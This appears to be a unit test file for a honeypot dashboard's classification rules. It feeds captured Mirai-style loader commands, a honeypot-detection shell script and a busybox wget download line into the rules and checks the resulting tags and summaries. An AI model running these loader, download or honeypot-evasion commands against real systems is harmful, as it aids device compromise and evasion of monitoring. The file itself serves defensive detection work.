"""Rules against real scripts seen on the honeypot. Run: python3 -m unittest discover dashboard/tests"""
import random
import string
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import honeypot_rules as rules  # noqa: E402

# Mirai-family loader, 2026-11-19 (verbatim from Cowrie)
MIRAI = ["sh", "shell", "shell", "enable", "enable", "system", "system", "ping; sh", "", "/bin/busybox HISILICON"] + [
    f">{d}/.f && chmod 777 {d}/.f && {d}/.f && cd {d}/;" for d in
    ("/var", "/var/tmp", "/var/run", "/dev", "/dev/shm", "/data", "/etc", "/mnt", "/usr", "/boot", "/home")] + [
    ">/root/.f && chmod 777 /root/.f && /root/.f && cd /root/; /bin/busybox HISILICON", "/bin/busybox HISILICON",
    "/bin/busybox cat /proc/self/exe || cat /proc/self/exe"]


def detector(seed):
    """The honeypot detector from 2026-11-19: random check token and random arithmetic per run."""
    rng = random.Random(seed)
    tok = "".join(rng.choice(string.ascii_letters + string.digits) for _ in range(40))
    a, b, c = rng.randint(100, 999), rng.randint(100, 999), rng.randint(1, 99)
    k = f"check_{tok}"
    q = "'\"'\"'"
    out = []
    for small in (f"printf '\\n%s|%s\\n' '{k}_small_control' '{k}'",
                  f"printf '\\n%s|%s\\n' '{k}_small_math' \"$(({a}*{b}+{c}))\"",
                  f"printf '\\n%s|%s\\n' '{k}_small_pid' \"$$\"",
                  f"set -- '{k}_arg1' '{k}_arg2'; printf '\\n%s|%s\\n' '{k}_small_positional' \"$#|$1|$2\"",
                  f"f_{k}() {{ printf '\\n%s|%s\\n' '{k}_small_function' \"$1|$#\"; }}; f_{k} '{k}_function_value'",
                  f"printf '\\n%s\\n' '{k}_small_done'"):
        out += ["sh -c '" + small.replace("'", q) + "'", small]
    out += [f"echo; echo '{k}_transport_done'",
            "if IFS=' ' read -r _filter_pid _filter_rest < /proc/self/stat; then _filter_status_pid=NA; "
            "_filter_ns=NA; _filter_status_ok=0; if [ -r /proc/self/status ]; then _filter_status_ok=1; "
            "while IFS=: read -r _filter_key _filter_values; do case \"$_filter_key\" in Pid) "
            "_filter_status_pid=$_filter_values;; NSpid) _filter_ns=$_filter_values;; esac; done < /proc/self/status; fi",
            f"value=$((19+23)); if [ \"$value\" -eq 42 ]; then printf '%s\\n' '{k}' \"$value\" 'branch-ok'; else exit 9; fi",
            f"printf '%s\\n' '{k}' | while IFS= read -r line; do printf 'pipe=%s\\n' \"$line\"; done",
            "v=outer; (v=inner; printf 'child=%s\\n' \"$v\"); printf 'parent=%s\\n' \"$v\"",
            "printf '%s\\n' 'a b;$()'",
            f"printf '%s\\n' '{k}' >&2; exit 37", f"echo; echo '{k}_transport_done'"]
    return [s[:300] for s in out]     # parse_cowrie keeps 300 characters of input


class DetectorTest(unittest.TestCase):
    def test_runs_collapse_into_one_pattern(self):
        runs = [detector(seed) for seed in range(5)]
        self.assertNotEqual(runs[0], runs[1])
        self.assertEqual(len({rules.fingerprint(r) for r in runs}), 1)

    def test_arithmetic_is_normalized(self):
        self.assertEqual(rules.normalize('echo "$((403*680+1))"'), 'echo "$((<n>*<n>+<n>))"')
        self.assertEqual(rules.normalize('echo "$((957*292+32))"'), 'echo "$((<n>*<n>+<n>))"')
        self.assertEqual(rules.normalize("echo 42"), "echo 42")      # numbers outside $((...)) stay

    def test_tagged_and_summarized(self):
        a = rules.analyze(detector(1))
        self.assertEqual(a["tags"][0], "honeypot-check")
        self.assertTrue(a["label"].startswith("Honeypot check"))
        self.assertIn("Tested whether the shell is real", a["summary"])
        self.assertIn("/proc/self", a["summary"])
        self.assertIn("Cowrie fails this step", a["summary"])
        self.assertEqual(a["unrecognized"], [])


class MiraiTest(unittest.TestCase):
    def test_marker_escape_drop_site_and_arch(self):
        a = rules.analyze(MIRAI)
        self.assertEqual(a["markers"], ["HISILICON"])
        for tag in ("iot-probe", "drop-site", "recon"):
            self.assertIn(tag, a["tags"])
        self.assertNotIn("malware-drop", a["tags"])          # it never downloaded anything
        s = a["summary"]
        self.assertIn("binary architecture", s)
        self.assertIn("restricted router console", s)
        self.assertIn("“HISILICON”", s)
        self.assertIn("writable, executable directory", s)
        self.assertEqual(a["unrecognized"], [])

    def test_marker_word_separates_variants(self):
        other = [c.replace("HISILICON", "ECCHI") for c in MIRAI]
        self.assertNotEqual(rules.fingerprint(MIRAI), rules.fingerprint(other))
        self.assertEqual(rules.analyze(other)["markers"], ["ECCHI"])

    def test_lowercase_busybox_applets_are_not_markers(self):
        self.assertEqual(rules.analyze(["/bin/busybox wget http://198.51.100.7/x"])["markers"], [])


if __name__ == "__main__":
    unittest.main()
